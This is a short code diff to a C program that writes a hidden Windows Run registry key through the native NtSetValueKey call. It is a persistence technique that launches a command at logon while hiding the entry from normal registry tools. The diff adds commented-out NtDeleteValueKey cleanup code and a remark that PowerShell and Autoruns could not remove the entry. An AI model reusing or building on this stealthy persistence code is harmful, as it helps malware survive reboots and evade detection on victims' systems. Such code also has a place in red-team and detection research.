@@ -10,6 +10,7 @@ typedef struct _UNICODE_STRING {
 } UNICODE_STRING, *PUNICODE_STRING;
 
 typedef NTSTATUS(WINAPI* PNTSETVALUEKEY)(_In_ HANDLE KeyHandle, _In_ PUNICODE_STRING ValueName, _In_opt_ ULONG TitleIndex, _In_ ULONG Type, _In_opt_ PVOID Data, _In_ ULONG Size);
+//typedef NTSTATUS(WINAPI* PNTDELETEVALUEKEY)(_In_ HANDLE KeyHandle, _In_ PUNICODE_STRING ValueName);
 
 // prototypes
 void createHiddenRunKey(const WCHAR* runCmd);
@@ -32,6 +33,7 @@ void createHiddenRunKey(const WCHAR* runCmd) {
 
     HMODULE hNtDll = LoadLibraryA("ntdll.dll");
     PNTSETVALUEKEY pNtSetValueKey = (PNTSETVALUEKEY)GetProcAddress(hNtDll, "NtSetValueKey");
+    //PNTDELETEVALUEKEY pNtDeleteValueKey = (PNTDELETEVALUEKEY)GetProcAddress(hNtDll, "NtDeleteValueKey");
     if (pNtSetValueKey == NULL) {
         printf("[-] Failed to import NtSetValueKey function.\n");
     }
@@ -49,6 +51,10 @@ void createHiddenRunKey(const WCHAR* runCmd) {
             printf("[-] FAIL\n");
         }
 
+        // So far NtDeleteValueKey is the only way to clean PS && Autoruns did not work out 
+        //NTSTATUS status;
+        //status = pNtDeleteValueKey(hkResult, &ValueName);
+        
         RegCloseKey(hkResult);
     }
     else {
